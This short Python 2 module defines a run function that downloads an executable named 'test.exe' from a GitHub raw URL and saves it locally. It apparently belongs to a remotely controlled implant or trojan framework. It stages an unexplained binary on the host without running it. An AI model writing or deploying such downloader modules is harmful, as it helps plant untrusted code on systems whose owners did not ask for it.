import requests

def run(**args):
  try:
   
     goodie = "test.exe"
     url = 'https://github.com/experiment2016/workhub/raw/master/test.exe'
     r = requests.get(url, stream=True)

     with open(goodie, 'wb') as fd:
         for chunk in r.iter_content(chunk_size=1024):
             fd.write(chunk)
     fd.close()
     te = "ok"
     return str(te)
     
  except Exception, e:
      return str(e)

     


